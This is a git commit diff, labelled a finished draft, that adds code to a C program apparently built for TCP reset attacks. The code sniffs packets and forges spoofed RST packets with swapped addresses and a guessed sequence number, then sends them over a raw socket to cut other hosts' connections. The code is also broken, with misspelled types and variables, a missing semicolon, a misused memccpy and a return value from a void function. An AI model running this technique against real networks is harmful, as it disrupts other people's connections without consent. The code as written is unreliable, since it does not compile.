4b60da3ffc769be49cc228b0388fe9782076f8e5
Ethan Link <ethanlink255@gmail.com>
2022-03-23 13:01:03 -0400

    Finished Draft Code

--- RST/rst.c
+++ RST/rst.c
@@ -15,6 +15,39 @@
 #include <stdlib.h>
 
 
+struct pseudoheader{
+    u_int32_t source_address;
+    u_int32_t dest_address;
+    u_int8_t placeholder;
+    u_int8_t protocol;
+    u_int16_t tcp_length;
+
+}
+
+unsigned short csum(unsigned short *ptr,int nbytes) 
+{
+	register long sum;
+	unsigned short oddbyte;
+	register short answer;
+
+	sum=0;
+	while(nbytes>1) {
+		sum+=*ptr++;
+		nbytes-=2;
+	}
+	if(nbytes==1) {
+		oddbyte=0;
+		*((u_char*)&oddbyte)=*(u_char*)ptr;
+		sum+=oddbyte;
+	}
+
+	sum = (sum>>16)+(sum & 0xffff);
+	sum = sum + (sum>>16);
+	answer=(short)~sum;
+	
+	return(answer);
+}
+
 void handlePacket(char *buf, int s){
     struct iphdr *ip = (struct iphdr*)(buf + sizeof(struct ethhdr));
     if(ip->protocol == 6){
@@ -32,7 +65,7 @@ void handlePacket(char *buf, int s){
             exit(4);
         }
 
-        char datagram[4096];
+        char datagram[4096], *pseudogram;
         memset(datagram, 0, 4096);
 
         struct iphdr *ret = (struct iphdr*) datagram;
@@ -40,6 +73,10 @@ void handlePacket(char *buf, int s){
         struct tcphdr *spoof = (struct tchhdr*) (datagram + sizeof(stuct ip));
         struct sockaddr_in sin;
         struct pseudo_header psh;
+
+        sin.sin_family = AF_INET;
+        sin.sin_port = htons(spoof->dest); //might be incorrect 
+        sin.sin_addr.s_addr = ip->daddr;
 
         ret->ihl = 5;
         ret->version = 4;
@@ -52,11 +89,56 @@ void handlePacket(char *buf, int s){
         ret->check = 0;
         ret->saddr = ip->daddr;
         ret->daddr = ip->saddr;
+        ret->check = csum((unsigned short*) datagram, ret->tot_len);
 
+        spoof->dest = tcph->source;
+        spoof->source = tcph->dest;
+        spoof->seq = tcph->ack;
+        spoof->doff = 5;
+        spoof->fin = 0;
+        spoof->syn = 0;
+        spoof->rst = 1;
+        spoof->psh = 0;
+        spoof->ack = 0;
+        spoof->urg = 0;
+        spoof->window = htons(5840);
+        spoof->check = 0;
+        spoof->urg_ptr = 0;
 
-        struct iphdr spoof;
-        spoof.dest = inet_pton(ip->src);
-        spoof.src = inet_pton(ip->dest);
+        struct pseudoheader psh;
+        psh.source_address = tcph->source;
+        psh.dest_address = tchp->dest;
+        psh.placeholder = 0;
+        psh.protocol = IPPROTO_TCP;
+        psh.tcp_length = htons(sizeof(struct tcphdr));
+
+        int psize = sizeof(struct pseudoheader) + sizeof(struct tcphdr);
+        pseudogram = malloc(psize); 
+
+        memcpy(pseudogram, (char*) &psh, sizeof(struct pseudoheader));
+        memccpy(pseudogram + sizeof(struct pseudoheader), spoof, sizeof(struct tcphdr));
+
+        spoof->check = csum((unsigned short*) pseudogram, psize);
+
+        int one = 1;
+        const int *val = &one;
+
+        if (setsockopt(sock, IPPROTO_TCP, IP_HDRINCL, val, sizeof(one)) < 0){
+            return -1;
+        }
+
+        //Send the packet
+		if (sendto (sock, datagram, ret->tot_len ,	0, (struct sockaddr *) &sin, sizeof (sin)) < 0)
+		{
+			perror("sendto failed");
+		}
+		//Data send successfully
+		else
+		{
+			printf ("Packet Send. Length : %d \n" , iph->tot_len);
+		}
+        // sleep for 1 seconds
+        sleep(1);
     
 
 
